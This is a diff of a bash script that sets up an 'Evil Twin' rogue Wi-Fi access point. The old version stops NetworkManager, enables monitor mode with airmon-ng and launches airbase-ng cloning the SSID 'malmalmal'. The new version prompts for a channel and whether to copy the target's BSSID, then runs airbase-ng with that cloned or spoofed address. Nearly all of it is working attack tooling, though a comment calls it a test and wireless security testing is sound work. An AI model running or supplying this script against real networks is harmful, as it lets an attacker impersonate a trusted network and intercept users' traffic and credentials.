@@ -1,21 +1,38 @@
 #!/bin/bash
 
-cleanup() {
-    echo "[*] Restoring network manager and interfaces..."
-    service NetworkManager start
-    airmon-ng stop wlan1
-}
+echo "=== Evil Twin Setup ==="
 
-# Trap EXIT (normal exit) and INT (Ctrl+C)
-trap cleanup EXIT INT
+# Ask if we should use the same BSSID
+while true; do
+    read -rp "Use same BSSID as 'malmalmal'? (y/n): " SAME_BSSID
+    if [[ "$SAME_BSSID" == "y" || "$SAME_BSSID" == "n" ]]; then
+        break
+    else
+        echo "Please enter 'y' or 'n'"
+    fi
+done
 
-echo "[*] Starting Evil Twin test..."
+# Ask for the channel
+while true; do
+    read -rp "Enter desired channel (1-11): " CHANNEL
+    if [[ "$CHANNEL" =~ ^[0-9]+$ ]] && (( CHANNEL >= 1 && CHANNEL <= 11 )); then
+        break
+    else
+        echo "Channel must be a number between 1 and 11"
+    fi
+done
 
-# Stop NetworkManager to prevent it from interfering
-service NetworkManager stop
+# Simulate results
+if [[ "$SAME_BSSID" == "y" ]]; then
+    BSSID="BC:A5:11:DF:04:7E" 
+    echo "[+] Using same BSSID: $BSSID"
+else
+    BSSID="66:77:88:99:AA:BB"  # Randomized or spoofed BSSID
+    echo "[+] Using different BSSID: $BSSID"
+fi
 
-# Start monitor mode on wlan1 (this will create mon0)
-airmon-ng start wlan1
+echo "[+] Selected Channel: $CHANNEL"
 
-# Launch rogue AP (this will create at0)
-airbase-ng -a 80:37:73:FD:83:D6 -e "malmalmal" -c 6 mon0
+# Example placeholder for launching airbase-ng
+# Replace with actual logic or commands
+airbase-ng -e malmalmal -a $BSSID -c $CHANNEL wlan1mon
